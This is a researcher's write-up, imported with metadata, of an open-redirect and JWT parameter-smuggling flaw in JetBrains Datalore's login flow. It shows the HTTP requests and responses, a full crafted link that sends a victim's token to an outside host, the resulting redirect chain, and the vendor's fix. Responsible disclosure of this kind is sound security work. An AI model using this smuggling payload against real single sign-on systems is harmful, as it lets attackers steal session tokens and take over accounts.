---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-09-05_eye-for-an-eye-unusual-single-click-jwt-token-takeover.md
original_filename: 2021-09-05_eye-for-an-eye-unusual-single-click-jwt-token-takeover.md
title: 'Eye for an eye: Unusual single click JWT token takeover'
category: documents
detected_topics:
- access-control
- ssrf
- oauth
- sso
- jwt
- xss
tags:
- imported
- documents
- access-control
- ssrf
- oauth
- sso
- jwt
- xss
language: en
raw_sha256: 81603dd4bf698d523e1242db7a4e9ea995b0610a347c1daa966291ab936e4a51
text_sha256: 0cb7881c195efdb2e433943f39c153f4eb3129d71bed28410ec079441c80c1e4
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# Eye for an eye: Unusual single click JWT token takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-09-05_eye-for-an-eye-unusual-single-click-jwt-token-takeover.md
- Source Type: markdown
- Detected Topics: access-control, ssrf, oauth, sso, jwt, xss
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `81603dd4bf698d523e1242db7a4e9ea995b0610a347c1daa966291ab936e4a51`
- Text SHA256: `0cb7881c195efdb2e433943f39c153f4eb3129d71bed28410ec079441c80c1e4`


## Content

---
title: "Eye for an eye: Unusual single click JWT token takeover"
url: "https://infosecwriteups.com/eye-for-an-eye-unusual-single-click-jwt-token-takeover-2e58f88cf44d"
authors: ["Yurii Sanin (@SaninYurii)"]
programs: ["JetBrains"]
bugs: ["Open redirect", "JWT", "Account takeover"]
publication_date: "2021-09-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3344
scraped_via: "browseros"
---

# Eye for an eye: Unusual single click JWT token takeover

Top highlight

Eye for an eye: Unusual single click JWT token takeover
This story is about an unusual open redirect misconfiguration I found in JetBrains Datalore.
Yurii Sanin
Follow
3 min read
·
Sep 5, 2021

252

Press enter or click to view image in full size
Description

The story begins when I found an open redirect in one of the Datalore endpoints. The endpoint relates to authentication via JetBrains Account. At first, this redirector looked harmless, but, anyway, I decided to look closer at how the authentication process works.

Request:
GET /jetbrains_auth?jwt={token}&return_to=https://0d.tf/ HTTP/1.1
Host: datalore.jetbrains.com
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8
Connection: close
Response:
HTTP/1.1 302
Date: Tue, 01 Jun 2021 19:50:54 GMT
Content-Length: 0
Connection: close
Set-Cookie: route={route}; Path=/; Secure; HttpOnly
Set-Cookie: DATALORESESSIONID={session-id}; Path=/; Secure; HttpOnly
Location: https://0d.tf/
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
X-Content-Type-Options: nosniff
X-XSS-Protection: 1

I’ve checked the endpoint which initiates redirects to the Datalore with JWT token, and here’s how the request looks like:

Request:
GET /jwt-auth/datalore?auth_url=https%3A%2F%2Fdatalore.jetbrains.com%2Fjetbrains_auth&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F HTTP/1.1
Host: http://account.jetbrains.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
Response:
HTTP/1.1 302
Date: Tue, 01 Jun 2021 10:00:54 GMT
Content-Length: 0
Connection: close
Server: nginx
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Pragma: no-cache
Expires: -1
Location: https://datalore.jetbrains.com/jetbrains_auth?jwt={jwt-token-here}&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F

As you can see, it takes the address of the target host in the auth_url query parameter.

Here are some interesting facts about the parameter:

The address can be any subdomain of jetbrains.com
You can supply the path and query parameters within the URL

I got an idea to smuggle a valid JWT token as part of the auth_url parameter, and here is what happened next:

Request:
GET /jwt-auth/datalore?auth_url=https%3A%2F%2Fdatalore.jetbrains.com%2Fjetbrains_auth?jwt={attacker's-jwt}&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F HTTP/1.1
Host: http://account.jetbrains.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
Response:
HTTP/1.1 302
Date: Tue, 01 Jun 2021 10:00:54 GMT
Content-Length: 0
Connection: close
Server: nginx
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Pragma: no-cache
Expires: -1
Location: https://datalore.jetbrains.com/jetbrains_auth?jwt={attacker's-jwt-token}?jwt={victim's-jwt-token}&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F

The endpoint returned a Location header with both JWT tokens in query parameters. The first one — supplied by me as part of auth_url, and the second was from JetBrains Account.

Get Yurii Sanin’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

As a next step, I tried to smuggle the return_to parameter as part of auth_url. The idea is quite simple — it will allow me to place a valid JWT token as the first parameter and add the victim’s JWT as part of the smuggled return_to parameter.

Attacker's host: 
&return_to=https%3A%2F%2F0d.tf
Url encoded attacker's host: %26%72%65%74%75%72%6e%5f%74%6f%3d%68%74%74%70%73%25%33%41%25%32%46%25%32%46%30%64%2e%74%

So, the final malicious link looks like this:

https://account.jetbrains.com/jwt-auth/datalore?auth_url=https://datalore.jetbrains.com/jetbrains_auth?jwt={attacker's_jwt}%26%72%65%74%75%72%6e%5f%74%6f%3d%68%74%74%70%73%25%33%41%25%32%46%25%32%46%30%64%2e%74%66&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F

Here’s what is going to happen if someone opens the link:

1. 302 Redirect -> https://datalore.jetbrains.com/jetbrains_auth?jwt={attacker's-jwt}&return_to=https%3A%2F%2F0d.tf?jwt={victim's-jwt}&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F
2. 302 Redirect -> https://0d.tf?jwt={victim's-jwt}&return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F
3. JWT TOKEN -> Application session
Press enter or click to view image in full size
Example of smuggling of JWT token and return URI.
Press enter or click to view image in full size
Example of taking over victim’s JWT token.
Impact

An attacker could take over a user’s JWT token and gain access to its Datalore account. Attack complexity is quite simple — an attacker would need to craft a link with a valid JWT token (eye for an eye situation) and trick a victim into click on it. Moreover, it is technically easy for an attacker to create a script to automate the attack process.

Mitigation

Datalore team implemented return URL validation which makes it impossible to exploit open redirect vulnerability. As the next step, they removed the legacy authentication process and implemented OAuth integration with the JetBrains Account as an identity provider (Great job!).

That’s it. I hope you liked this. Any questions? DM @ saninyurii

Here’s some more stories:

How I found a primitive but critical broken access control vulnerability in YouTrack (CVE-2020–24618)
CVE-2020–15823: Server-Side Request Forgery (SSRF) in JetBrains YouTrack
